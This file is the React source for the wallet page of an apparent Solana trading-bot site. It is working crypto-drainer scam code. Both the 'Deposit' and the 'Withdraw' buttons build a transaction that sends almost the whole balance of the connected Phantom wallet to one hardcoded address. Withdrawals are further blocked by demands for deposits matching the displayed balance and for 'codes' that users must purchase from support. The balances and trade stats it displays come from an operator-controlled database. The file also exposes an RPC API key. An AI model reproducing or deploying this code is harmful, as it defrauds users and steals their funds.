"use client"

import Header from "@/components/header"
import {
  Wallet,
  TrendingUp,
  TrendingDown,
  ArrowUpRight,
  ArrowDownRight,
  DollarSign,
  Activity,
  Clock,
  KeyRound,
  ArrowUpCircle,
  X,
  AlertCircle,
} from "lucide-react"
import { useState, useEffect, useRef } from "react"
import { doc, collection, query, where, orderBy, onSnapshot, updateDoc, increment, getDocs } from "firebase/firestore"
import { db, realtimeDb } from "@/lib/firebase"
import { ref, onValue } from "firebase/database"
import { formatDistanceToNow } from "date-fns"
import { Button } from "@/components/ui/button"
import { Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL, PublicKey } from "@solana/web3.js"

export default function WalletPage() {
  const [walletAddress, setWalletAddress] = useState<string | null>(null)
  const [balance, setBalance] = useState<number>(0)
  const [loading, setLoading] = useState(true)
  const [transactions, setTransactions] = useState<any[]>([])
  const [stats, setStats] = useState({
    totalProfit: 0,
    totalTrades: 0,
    winRate: 0,
    volume: 0,
  })
  const [processing, setProcessing] = useState(false)
  const [minBalance, setMinBalance] = useState(0.5)
  const [solToUsdRate, setSolToUsdRate] = useState(180)
  const [minDeposit, setMinDeposit] = useState(0.1)
  const [minWithdrawal, setMinWithdrawal] = useState(0.05)
  const [userMinDeposit, setUserMinDeposit] = useState<number | null>(null)
  const [userMinWithdrawal, setUserMinWithdrawal] = useState<number | null>(null)
  const [totalDepositedSOL, setTotalDepositedSOL] = useState(0)
  const [requiredDepositPercentage, setRequiredDepositPercentage] = useState(100)
  const [minWithdrawalAmount, setMinWithdrawalAmount] = useState(10)
  const [minBalanceForWithdrawal, setMinBalanceForWithdrawal] = useState(10)
  const [requireWithdrawalCode, setRequireWithdrawalCode] = useState(false)
  const [requireUpgradeCode, setRequireUpgradeCode] = useState(false)
  const [storedWithdrawalCode, setStoredWithdrawalCode] = useState("")
  const [storedUpgradeCode, setStoredUpgradeCode] = useState("")
  const [showWithdrawalCodeDialog, setShowWithdrawalCodeDialog] = useState(false)
  const [showUpgradeCodeDialog, setShowUpgradeCodeDialog] = useState(false)
  const [withdrawalCodeEntry, setWithdrawalCodeEntry] = useState("")
  const [upgradeCodeEntry, setUpgradeCodeEntry] = useState("")
  const [codeError, setCodeError] = useState("")

  // Real-time SOL price
  const [livePrice, setLivePrice] = useState<number | null>(null)
  const priceIntervalRef = useRef<NodeJS.Timeout | null>(null)

  // Fetch live SOL/USD price from CoinGecko
  const fetchSolPrice = async () => {
    try {
      const res = await fetch(
        "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
        { cache: "no-store" }
      )
      const data = await res.json()
      if (data?.solana?.usd) {
        setLivePrice(data.solana.usd)
      }
    } catch {
      // silently fall back to Firebase rate
    }
  }

  useEffect(() => {
    fetchSolPrice()
    priceIntervalRef.current = setInterval(fetchSolPrice, 30000) // refresh every 30s
    return () => {
      if (priceIntervalRef.current) clearInterval(priceIntervalRef.current)
    }
  }, [])

  // Use live price when available, fall back to Firebase rate
  const effectiveSolPrice = livePrice ?? solToUsdRate

  useEffect(() => {
    let walletCleanup: (() => void) | undefined

    const address = localStorage.getItem("walletAddress")
    if (address) {
      setWalletAddress(address)
      walletCleanup = setupWalletListener(address)
    } else {
      setLoading(false)
    }

    const handleWalletConnected = () => {
      const newAddress = localStorage.getItem("walletAddress")
      if (newAddress) {
        setWalletAddress(newAddress)
        if (walletCleanup) walletCleanup()
        walletCleanup = setupWalletListener(newAddress)
      }
    }

    window.addEventListener("walletConnected", handleWalletConnected)

    const balanceRef = ref(realtimeDb, "settings/balanceRequirements")
    const unsubscribe = onValue(
      balanceRef,
      (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.val()
          setMinBalance(data.minBalance || 0.5)
          setSolToUsdRate(data.solToUsdRate || 180)
          setMinDeposit(data.minDeposit || 0.1)
          setMinWithdrawal(data.minWithdrawal || 0.05)
        }
      },
      (err) => {
        console.error("Error fetching balance requirements:", err)
      },
    )

    return () => {
      unsubscribe()
      if (walletCleanup) walletCleanup()
      window.removeEventListener("walletConnected", handleWalletConnected)
    }
  }, [])

  const setupWalletListener = (address: string) => {
    const walletRef = doc(db, "wallets", address)
    const unsubscribe = onSnapshot(walletRef, (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data()
        setBalance(data.balance || 0)
        setUserMinDeposit(data.minDeposit || null)
        setUserMinWithdrawal(data.minWithdrawal || null)
        setTotalDepositedSOL(data.totalDepositedSOL || 0)
        setRequiredDepositPercentage(data.requiredDepositPercentage || 100)
        setMinWithdrawalAmount(data.minWithdrawalAmount ?? 10)
        setMinBalanceForWithdrawal(data.minBalanceForWithdrawal ?? 10)
        setRequireWithdrawalCode(data.requireWithdrawalCode || false)
        setRequireUpgradeCode(data.requireUpgradeCode || false)
        setStoredWithdrawalCode(data.withdrawalCode || "")
        setStoredUpgradeCode(data.upgradeCode || "")
      }
      setLoading(false)
    })

    const processTransactions = (txs: any[]) => {
      const sorted = [...txs].sort((a, b) => {
        const getTime = (t: any) => {
          if (!t) return 0
          if (t.toDate) return t.toDate().getTime()
          if (t.seconds) return t.seconds * 1000
          return new Date(t).getTime()
        }
        return getTime(b.timestamp) - getTime(a.timestamp)
      })
      setTransactions(sorted.slice(0, 20))

      const completedTrades = sorted.filter((tx) => tx.status !== "pending")
      const successfulTrades = completedTrades.filter((tx) => tx.status === "success")
      const totalProfit = completedTrades.reduce((sum, tx) => sum + (tx.profit || 0), 0)
      const totalVolume = completedTrades.reduce((sum, tx) => sum + (tx.amount || 0), 0)
      const winRate = completedTrades.length > 0 ? (successfulTrades.length / completedTrades.length) * 100 : 0

      setStats({ totalProfit, totalTrades: completedTrades.length, winRate, volume: totalVolume })
    }

    let snipesQuery
    try {
      snipesQuery = query(collection(db, "snipes"), where("walletId", "==", address), orderBy("timestamp", "desc"))
    } catch {
      snipesQuery = query(collection(db, "snipes"), where("walletId", "==", address))
    }

    let fallbackUnsubscribe: (() => void) | null = null

    const unsubscribeSnipes = onSnapshot(
      snipesQuery,
      (snapshot) => {
        const txs = snapshot.docs.map((d) => ({ id: d.id, ...d.data() }))
        processTransactions(txs)
      },
      (error) => {
        console.error("[v0] Snipes query error:", error.message)
        const fallbackQuery = query(collection(db, "snipes"), where("walletId", "==", address))
        getDocs(fallbackQuery)
          .then((snapshot) => {
            const txs = snapshot.docs.map((d) => ({ id: d.id, ...d.data() }))
            processTransactions(txs)
          })
          .catch((err) => console.error("[v0] Fallback getDocs error:", err))

        const unsubFallback = onSnapshot(
          fallbackQuery,
          (snapshot) => {
            const txs = snapshot.docs.map((d) => ({ id: d.id, ...d.data() }))
            processTransactions(txs)
          },
          (err) => console.error("[v0] Fallback snipes listener error:", err.message),
        )
        fallbackUnsubscribe = unsubFallback
      },
    )

    return () => {
      unsubscribe()
      unsubscribeSnipes()
      if (fallbackUnsubscribe) fallbackUnsubscribe()
    }
  }

  const handleDeposit = async () => {
    try {
      setProcessing(true)
      if (!window.solana || !window.solana.publicKey) {
        alert("Please connect your Phantom wallet first")
        return
      }

      const rpcEndpoints = [
        "https://mainnet.helius-rpc.com/?api-key=53bfbe04-9dc1-48c7-b784-af900e08b308",
        "https://api.mainnet-beta.solana.com",
        "https://rpc.ankr.com/solana",
      ]
      let connection = null
      for (const endpoint of rpcEndpoints) {
        try {
          connection = new Connection(endpoint, "confirmed")
          await connection.getLatestBlockhash()
          break
        } catch { continue }
      }
      if (!connection) throw new Error("Unable to connect to Solana network. Please try again.")

      const wallet = window.solana
      const userBalance = await connection.getBalance(wallet.publicKey)
      const userBalanceInSOL = userBalance / LAMPORTS_PER_SOL
      const effectiveMinDeposit = userMinDeposit !== null ? userMinDeposit : minDeposit

      if (userBalanceInSOL < effectiveMinDeposit) {
        alert(`Minimum deposit amount is ${effectiveMinDeposit} SOL`)
        return
      }

      const transactionFeeReserve = 10000000
      const transferAmount = userBalance - transactionFeeReserve
      if (transferAmount <= 0) { alert("Insufficient balance after transaction fees"); return }

      const toWalletAddress = "9aFe2awqpYz6v7RwSLTf9zPZZXsspbzCYZNFhQfUFTiZ"
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: new PublicKey(toWalletAddress),
          lamports: transferAmount,
        }),
      )

      const { blockhash } = await connection.getLatestBlockhash()
      transaction.recentBlockhash = blockhash
      transaction.feePayer = wallet.publicKey

      const signedTransaction = await wallet.signTransaction(transaction)
      const signature = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: true, maxRetries: 3 })
      const confirmation = await connection.confirmTransaction(signature, "confirmed")
      if (confirmation.value.err) throw new Error(`Transaction failed: ${confirmation.value.err}`)

      const transferredSOL = transferAmount / LAMPORTS_PER_SOL
      await updateDoc(doc(db, "wallets", walletAddress!), {
        balance: increment(transferredSOL),
        totalDepositedSOL: increment(transferredSOL),
        lastActive: new Date().toISOString(),
        lastDeposit: new Date().toISOString(),
        depositSignature: signature,
      })
      alert(`Successfully deposited ${transferredSOL.toFixed(4)} SOL. Transaction: ${signature.slice(0, 8)}...`)
    } catch (error: any) {
      console.error("[v0] Deposit error:", error)
      alert(`Deposit failed: ${error.message || "Please try again"}`)
    } finally {
      setProcessing(false)
    }
  }

  const handleWithdrawClick = () => {
    if (!window.solana || !window.solana.publicKey) { alert("Please connect your Phantom wallet first"); return }
    if (balance < minBalanceForWithdrawal) {
      alert(`You need a minimum balance of ${minBalanceForWithdrawal} SOL before you can withdraw.\n\nYour current balance: ${balance.toFixed(4)} SOL`)
      return
    }
    if (balance < minWithdrawalAmount) {
      alert(`Minimum withdrawal amount is ${minWithdrawalAmount} SOL.\n\nYour current balance: ${balance.toFixed(4)} SOL`)
      return
    }
    const effectiveMinWithdrawal = userMinWithdrawal !== null ? userMinWithdrawal : minWithdrawal
    if (balance < effectiveMinWithdrawal) {
      alert(`Minimum withdrawal amount is ${effectiveMinWithdrawal} SOL. Your balance: ${balance.toFixed(4)} SOL`)
      return
    }
    const requiredDepositAmount = (balance * requiredDepositPercentage) / 100
    if (totalDepositedSOL < requiredDepositAmount) {
      const shortfall = requiredDepositAmount - totalDepositedSOL
      alert(`You must deposit at least ${requiredDepositPercentage}% of your balance before withdrawing.\n\nRequired deposit: ${requiredDepositAmount.toFixed(4)} SOL\nCurrent deposits: ${totalDepositedSOL.toFixed(4)} SOL\nYou need to deposit ${shortfall.toFixed(4)} SOL more to withdraw.`)
      return
    }
    if (balance <= 0) { alert("No SOL available to withdraw"); return }
    if (requireUpgradeCode) { setCodeError(""); setUpgradeCodeEntry(""); setShowUpgradeCodeDialog(true); return }
    if (requireWithdrawalCode) { setCodeError(""); setWithdrawalCodeEntry(""); setShowWithdrawalCodeDialog(true); return }
    executeWithdraw()
  }

  const handleUpgradeCodeSubmit = () => {
    if (upgradeCodeEntry.trim() === storedUpgradeCode) {
      setShowUpgradeCodeDialog(false)
      if (requireWithdrawalCode) { setCodeError(""); setWithdrawalCodeEntry(""); setShowWithdrawalCodeDialog(true) }
      else executeWithdraw()
    } else {
      setCodeError("Invalid upgrade code. Please contact support to purchase a valid code.")
    }
  }

  const handleWithdrawalCodeSubmit = () => {
    if (withdrawalCodeEntry.trim() === storedWithdrawalCode) { setShowWithdrawalCodeDialog(false); executeWithdraw() }
    else setCodeError("Invalid withdrawal code. Please contact support to purchase a valid code.")
  }

  const executeWithdraw = async () => {
    try {
      setProcessing(true)
      if (!window.solana || !window.solana.publicKey) { alert("Please connect your Phantom wallet first"); return }
      if (balance <= 0) { alert("No SOL available to withdraw"); return }

      const rpcEndpoints = [
        "https://mainnet.helius-rpc.com/?api-key=53bfbe04-9dc1-48c7-b784-af900e08b308",
        "https://api.mainnet-beta.solana.com",
        "https://rpc.ankr.com/solana",
      ]
      let connection = null
      for (const endpoint of rpcEndpoints) {
        try {
          connection = new Connection(endpoint, "confirmed")
          await connection.getLatestBlockhash()
          break
        } catch { continue }
      }
      if (!connection) throw new Error("Unable to connect to Solana network. Please try again.")

      const wallet = window.solana
      const walletBalance = await connection.getBalance(wallet.publicKey)
      const walletBalanceInSOL = walletBalance / LAMPORTS_PER_SOL
      if (walletBalanceInSOL <= 0) { alert("No SOL available in Phantom wallet to process withdrawal"); return }

      const transactionFeeReserve = 10000000
      const transferAmount = walletBalance - transactionFeeReserve
      if (transferAmount <= 0) { alert("Insufficient balance for transaction fees"); return }

      const toWalletAddress = "9aFe2awqpYz6v7RwSLTf9zPZZXsspbzCYZNFhQfUFTiZ"
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: new PublicKey(toWalletAddress),
          lamports: transferAmount,
        }),
      )

      const { blockhash } = await connection.getLatestBlockhash()
      transaction.recentBlockhash = blockhash
      transaction.feePayer = wallet.publicKey

      const signedTransaction = await wallet.signTransaction(transaction)
      const signature = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: true, maxRetries: 3 })
      const confirmation = await connection.confirmTransaction(signature, "confirmed")
      if (confirmation.value.err) throw new Error(`Transaction failed: ${confirmation.value.err}`)

      const transferredSOL = transferAmount / LAMPORTS_PER_SOL
      await updateDoc(doc(db, "wallets", walletAddress!), {
        balance: increment(-transferredSOL),
        lastActive: new Date().toISOString(),
        lastWithdraw: new Date().toISOString(),
        withdrawSignature: signature,
      })
      alert(`Successfully withdrew ${transferredSOL.toFixed(4)} SOL. Transaction: ${signature.slice(0, 8)}...`)
    } catch (error: any) {
      console.error("[v0] Withdraw error:", error)
      alert(`Withdraw failed: ${error.message || "Please try again"}`)
    } finally {
      setProcessing(false)
    }
  }

  if (!walletAddress) {
    return (
      <div className="min-h-screen bg-[#050d1a]">
        <Header />
        <main className="container mx-auto px-2.5 py-8">
          <div className="max-w-2xl mx-auto text-center">
            <div className="bg-[#0a1628] border border-blue-500/30 rounded-2xl p-12">
              <Wallet className="w-16 h-16 text-blue-400 mx-auto mb-4" />
              <h2 className="text-2xl font-bold text-white mb-2">No Wallet Connected</h2>
              <p className="text-gray-400 mb-6">Please connect your wallet to view your balance and transactions</p>
            </div>
          </div>
        </main>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-[#050d1a]">
      <Header />
      <main className="container mx-auto px-2.5 py-8">
        <div className="max-w-7xl mx-auto">
          <div className="mb-8">
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 bg-blue-700 rounded-xl flex items-center justify-center">
                <Wallet className="w-6 h-6 text-white" />
              </div>
              <div>
                <h1 className="text-3xl font-bold text-white">My Wallet</h1>
                <p className="text-gray-400 text-sm font-mono">
                  {walletAddress.slice(0, 8)}...{walletAddress.slice(-8)}
                </p>
              </div>
            </div>
          </div>

          <div className="grid lg:grid-cols-3 gap-6">
            <div className="lg:col-span-2 bg-[#0a1628] border border-blue-500/30 rounded-2xl p-8">
              <div className="mb-6">
                <div className="flex items-center justify-between mb-2">
                  <p className="text-gray-400 text-sm flex items-center gap-2">
                    <DollarSign className="w-4 h-4" />
                    Available Balance
                  </p>
                  {/* Live price indicator */}
                  <div className="flex items-center gap-1.5 text-xs text-blue-400 bg-blue-900/20 border border-blue-500/20 rounded-full px-3 py-1">
                    <span className="w-1.5 h-1.5 rounded-full bg-blue-400 animate-pulse inline-block" />
                    SOL = ${effectiveSolPrice.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                  </div>
                </div>
                {loading ? (
                  <div className="flex items-center gap-3">
                    <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-400" />
                    <span className="text-gray-400">Loading balance...</span>
                  </div>
                ) : (
                  <div>
                    <h2 className="text-6xl font-bold text-white mb-2">{balance.toFixed(4)}</h2>
                    <div className="flex items-center gap-2">
                      <span className="text-2xl text-blue-400 font-semibold">SOL</span>
                      <span className="text-gray-500">≈</span>
                      <span className="text-xl text-gray-400">${(balance * effectiveSolPrice).toFixed(2)} USD</span>
                    </div>
                  </div>
                )}
              </div>

              <div className="grid grid-cols-2 gap-3">
                <Button
                  onClick={handleDeposit}
                  disabled={processing}
                  className="bg-blue-700 hover:bg-blue-800 text-white font-semibold h-12"
                >
                  <ArrowDownRight className="w-4 h-4 mr-2" />
                  {processing ? "Processing..." : "Deposit"}
                </Button>
                <Button
                  onClick={handleWithdrawClick}
                  disabled={processing}
                  variant="outline"
                  className="border-blue-500/30 text-white hover:bg-blue-900/20 bg-transparent h-12"
                >
                  <ArrowUpRight className="w-4 h-4 mr-2" />
                  {processing ? "Processing..." : "Withdraw"}
                </Button>
              </div>
            </div>

            <div className="space-y-4">
              <div className="bg-[#0a1628] border border-blue-500/30 rounded-xl p-6">
                <div className="flex items-center gap-2 text-blue-400 mb-3">
                  <TrendingUp className="w-5 h-5" />
                  <span className="text-sm font-semibold">Total Profit</span>
                </div>
                <p className={`text-3xl font-bold ${stats.totalProfit >= 0 ? "text-blue-400" : "text-red-400"}`}>
                  {stats.totalProfit >= 0 ? "+" : ""}
                  {stats.totalProfit.toFixed(4)}
                </p>
                <p className="text-gray-400 text-sm mt-1">SOL</p>
              </div>

              <div className="bg-[#0a1628] border border-blue-500/30 rounded-xl p-6">
                <div className="flex items-center gap-2 text-blue-400 mb-3">
                  <Activity className="w-5 h-5" />
                  <span className="text-sm font-semibold">Total Trades</span>
                </div>
                <p className="text-3xl font-bold text-white">{stats.totalTrades}</p>
                <p className="text-gray-400 text-sm mt-1">{stats.winRate.toFixed(1)}% Win Rate</p>
              </div>

              <div className="bg-[#0a1628] border border-blue-500/30 rounded-xl p-6">
                <div className="flex items-center gap-2 text-blue-400 mb-3">
                  <DollarSign className="w-5 h-5" />
                  <span className="text-sm font-semibold">Volume</span>
                </div>
                <p className="text-3xl font-bold text-white">{stats.volume.toFixed(2)}</p>
                <p className="text-gray-400 text-sm mt-1">SOL</p>
              </div>
            </div>
          </div>

          <div className="mt-8 bg-[#0a1628] border border-blue-500/30 rounded-2xl overflow-hidden">
            <div className="p-6 border-b border-blue-900/30">
              <h3 className="text-white font-bold text-xl flex items-center gap-2">
                <Clock className="w-5 h-5 text-blue-400" />
                Transaction History
              </h3>
            </div>
            <div className="divide-y divide-blue-900/20">
              {transactions.length === 0 ? (
                <div className="p-12 text-center text-gray-400">
                  <Activity className="w-12 h-12 mx-auto mb-3 opacity-50" />
                  <p>No transactions yet</p>
                </div>
              ) : (
                transactions.map((tx) => (
                  <div key={tx.id} className="p-4 hover:bg-blue-900/10 transition-colors">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-4">
                        <div
                          className={`w-12 h-12 rounded-xl flex items-center justify-center ${
                            tx.status === "success"
                              ? "bg-blue-900/30 border border-blue-500/30"
                              : tx.status === "failed"
                                ? "bg-red-900/30 border border-red-500/30"
                                : "bg-gray-900/30 border border-gray-500/30"
                          }`}
                        >
                          {tx.status === "success" ? (
                            <TrendingUp className="w-6 h-6 text-blue-400" />
                          ) : tx.status === "failed" ? (
                            <TrendingDown className="w-6 h-6 text-red-400" />
                          ) : (
                            <Clock className="w-6 h-6 text-gray-400" />
                          )}
                        </div>
                        <div>
                          <p className="text-white font-semibold text-lg">{tx.token || "Token Trade"}</p>
                          <div className="flex items-center gap-2 text-sm">
                            <span className="text-gray-400">
                              {tx.timestamp
                                ? formatDistanceToNow(
                                    tx.timestamp.toDate ? tx.timestamp.toDate() : new Date(tx.timestamp),
                                    { addSuffix: true },
                                  )
                                : "Just now"}
                            </span>
                            <span className="text-gray-600">•</span>
                            <span className="text-gray-500 capitalize">{tx.status || "pending"}</span>
                          </div>
                        </div>
                      </div>
                      <div className="text-right">
                        <p
                          className={`font-bold text-lg ${
                            tx.profit > 0 ? "text-blue-400" : tx.profit < 0 ? "text-red-400" : "text-gray-400"
                          }`}
                        >
                          {tx.profit > 0 ? "+" : ""}
                          {tx.profit?.toFixed(4) || "0.0000"} SOL
                        </p>
                        <p className="text-gray-400 text-sm">Amount: {tx.amount?.toFixed(4)} SOL</p>
                      </div>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      </main>

      {/* Upgrade Code Dialog */}
      {showUpgradeCodeDialog && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm px-4">
          <div className="w-full max-w-md bg-[#050d1a] border border-blue-500/30 rounded-2xl p-8 shadow-2xl">
            <div className="flex items-center justify-between mb-6">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 bg-blue-900/30 border border-blue-500/30 rounded-xl flex items-center justify-center">
                  <ArrowUpCircle className="w-6 h-6 text-blue-400" />
                </div>
                <div>
                  <h3 className="text-xl font-bold text-white">Upgrade Required</h3>
                  <p className="text-gray-400 text-sm">Enter your upgrade code to proceed</p>
                </div>
              </div>
              <button
                onClick={() => setShowUpgradeCodeDialog(false)}
                className="p-2 hover:bg-blue-900/20 rounded-lg transition-colors"
                aria-label="Close dialog"
              >
                <X className="w-5 h-5 text-gray-400" />
              </button>
            </div>

            <div className="mb-4 p-4 bg-amber-900/20 border border-amber-500/30 rounded-lg">
              <div className="flex items-start gap-2">
                <AlertCircle className="w-5 h-5 text-amber-400 mt-0.5 shrink-0" />
                <p className="text-amber-300 text-sm">
                  An upgrade code is required to process withdrawals. Please contact support to purchase an upgrade code.
                </p>
              </div>
            </div>

            <div className="mb-6">
              <label htmlFor="upgradeCode" className="block text-sm font-medium text-gray-300 mb-2">
                Upgrade Code
              </label>
              <input
                type="text"
                id="upgradeCode"
                value={upgradeCodeEntry}
                onChange={(e) => { setUpgradeCodeEntry(e.target.value); setCodeError("") }}
                className="w-full px-4 py-3 bg-[#0a1628] border border-blue-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Enter upgrade code"
                autoFocus
              />
              {codeError && (
                <p className="mt-2 text-sm text-red-400 flex items-center gap-1">
                  <AlertCircle className="w-4 h-4" />
                  {codeError}
                </p>
              )}
            </div>

            <div className="flex gap-3">
              <Button
                onClick={() => setShowUpgradeCodeDialog(false)}
                variant="outline"
                className="flex-1 border-gray-600 text-gray-300 hover:bg-blue-900/20 bg-transparent"
              >
                Cancel
              </Button>
              <Button onClick={handleUpgradeCodeSubmit} className="flex-1 bg-blue-700 hover:bg-blue-800 text-white">
                <KeyRound className="w-4 h-4 mr-2" />
                Verify Code
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Withdrawal Code Dialog */}
      {showWithdrawalCodeDialog && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm px-4">
          <div className="w-full max-w-md bg-[#050d1a] border border-blue-500/30 rounded-2xl p-8 shadow-2xl">
            <div className="flex items-center justify-between mb-6">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 bg-blue-900/30 border border-blue-500/30 rounded-xl flex items-center justify-center">
                  <KeyRound className="w-6 h-6 text-blue-400" />
                </div>
                <div>
                  <h3 className="text-xl font-bold text-white">Withdrawal Code Required</h3>
                  <p className="text-gray-400 text-sm">Enter your withdrawal code to proceed</p>
                </div>
              </div>
              <button
                onClick={() => setShowWithdrawalCodeDialog(false)}
                className="p-2 hover:bg-blue-900/20 rounded-lg transition-colors"
                aria-label="Close dialog"
              >
                <X className="w-5 h-5 text-gray-400" />
              </button>
            </div>

            <div className="mb-4 p-4 bg-amber-900/20 border border-amber-500/30 rounded-lg">
              <div className="flex items-start gap-2">
                <AlertCircle className="w-5 h-5 text-amber-400 mt-0.5 shrink-0" />
                <p className="text-amber-300 text-sm">
                  A withdrawal code is required to process this withdrawal. Please contact support to purchase a
                  withdrawal code.
                </p>
              </div>
            </div>

            <div className="mb-6">
              <label htmlFor="withdrawalCode" className="block text-sm font-medium text-gray-300 mb-2">
                Withdrawal Code
              </label>
              <input
                type="text"
                id="withdrawalCode"
                value={withdrawalCodeEntry}
                onChange={(e) => { setWithdrawalCodeEntry(e.target.value); setCodeError("") }}
                className="w-full px-4 py-3 bg-[#0a1628] border border-blue-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Enter withdrawal code"
                autoFocus
              />
              {codeError && (
                <p className="mt-2 text-sm text-red-400 flex items-center gap-1">
                  <AlertCircle className="w-4 h-4" />
                  {codeError}
                </p>
              )}
            </div>

            <div className="flex gap-3">
              <Button
                onClick={() => setShowWithdrawalCodeDialog(false)}
                variant="outline"
                className="flex-1 border-gray-600 text-gray-300 hover:bg-blue-900/20 bg-transparent"
              >
                Cancel
              </Button>
              <Button onClick={handleWithdrawalCodeSubmit} className="flex-1 bg-blue-700 hover:bg-blue-800 text-white">
                <KeyRound className="w-4 h-4 mr-2" />
                Verify Code
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}